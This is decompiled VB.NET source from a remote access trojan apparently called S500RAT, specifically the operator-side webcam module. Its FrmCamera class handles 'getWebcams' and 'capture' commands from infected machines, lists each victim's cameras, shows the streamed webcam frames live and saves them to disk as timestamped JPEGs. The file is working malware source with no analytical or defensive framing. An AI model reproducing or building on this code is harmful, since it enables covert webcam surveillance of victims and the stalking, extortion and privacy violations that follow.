Imports System
Imports System.Diagnostics
Imports System.Drawing
Imports System.Drawing.Imaging
Imports System.IO
Imports System.Windows.Forms
Imports MessagePackLib.MessagePack
Imports Microsoft.VisualBasic.CompilerServices
Imports S500RAT.My
Imports S500RAT.Server.Connection

Namespace S500RAT
	' Token: 0x02000042 RID: 66
	Public Class FrmCamera
		' Token: 0x06001179 RID: 4473 RVA: 0x000970C0 File Offset: 0x000952C0
		Public Sub AddArrary(client As Clients, unpack_msgpack As MsgPack)
			Dim asString As String = unpack_msgpack.ForcePathObject("Command").AsString
			If Operators.CompareString(asString, "getWebcams", False) <> 0 Then
				If Operators.CompareString(asString, "capture", False) = 0 Then
					Dim formCamera As FormCamera = CType(Application.OpenForms("FormCamera" + unpack_msgpack.ForcePathObject("Hwid").AsString), FormCamera)
					Try
						Dim flag As Boolean = formCamera IsNot Nothing
						If flag Then
							Using memoryStream As MemoryStream = New MemoryStream(unpack_msgpack.ForcePathObject("Image").GetAsBytes())
								formCamera.GetImage = CType(Image.FromStream(memoryStream).Clone(), Image)
								formCamera.pictureBox1.Image = formCamera.GetImage
								Dim formCamera2 As FormCamera = formCamera
								Dim ptr As Integer = formCamera2.FPS
								formCamera2.FPS = ptr + 1
								Dim flag2 As Boolean = formCamera.sw.ElapsedMilliseconds >= 1000L
								If flag2 Then
									Dim checked As Boolean = formCamera.SaveScreen.Checked
									If checked Then
										Dim flag3 As Boolean = Not Directory.Exists(formCamera.FullPath)
										If flag3 Then
											Directory.CreateDirectory(formCamera.FullPath)
										End If
										formCamera.pictureBox1.Image.Save(formCamera.FullPath + String.Format("\\IMG_{0}.jpeg", DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss")), ImageFormat.Jpeg)
										Dim imageSaved As Label = formCamera.ImageSaved
										Dim label As Label = imageSaved
										imageSaved.Text = Conversions.ToString(Conversions.ToDouble(label.Text) + 1.0)
									End If
									Dim flag4 As Boolean = formCamera.FPS < 4
									If flag4 Then
										MyProject.Forms.FormHBrowser.FPS.ForeColor = Color.Orange
										formCamera.TextFPS.Text = Conversions.ToString(formCamera.FPS)
									Else
										Dim flag5 As Boolean = formCamera.FPS > 4
										If flag5 Then
											MyProject.Forms.FormHBrowser.FPS.ForeColor = Color.Green
											formCamera.TextFPS.Text = Conversions.ToString(formCamera.FPS)
										Else
											MyProject.Forms.FormHBrowser.FPS.ForeColor = Color.GreenYellow
											formCamera.TextFPS.Text = Conversions.ToString(formCamera.FPS)
										End If
									End If
									formCamera.SizeImage.Text = Functions.BytesToSize(memoryStream.Length)
									formCamera.FPS = 0
									formCamera.sw = Stopwatch.StartNew()
								End If
							End Using
						Else
							client.Disconnected()
						End If
					Catch ex As Exception
					End Try
				End If
			Else
				Dim formCamera3 As FormCamera = CType(Application.OpenForms("FormCamera" + unpack_msgpack.ForcePathObject("Hwid").AsString), FormCamera)
				Try
					Dim flag6 As Boolean = formCamera3 IsNot Nothing
					If flag6 Then
						formCamera3.Client = client
						formCamera3.Timer1.Start()
						For Each text As String In unpack_msgpack.ForcePathObject("List").AsString.Split(New String() { "-=>" }, StringSplitOptions.None)
							Dim flag7 As Boolean = Not String.IsNullOrWhiteSpace(text)
							If flag7 Then
								formCamera3.comboBox1.Items.Add(text)
							End If
						Next
						formCamera3.comboBox1.SelectedIndex = 0
						Dim flag8 As Boolean = Operators.CompareString(formCamera3.comboBox1.Text, "None", False) = 0
						If flag8 Then
							client.Disconnected()
						Else
							formCamera3.comboBox1.Enabled = True
							formCamera3.StartAndStop.Enabled = True
							formCamera3.SaveScreen.Enabled = True
							formCamera3.QualityUsing.Enabled = True
							formCamera3.StartAndStop.Enabled = True
						End If
					Else
						client.Disconnected()
					End If
				Catch ex2 As Exception
				End Try
			End If
		End Sub
	End Class
End Namespace
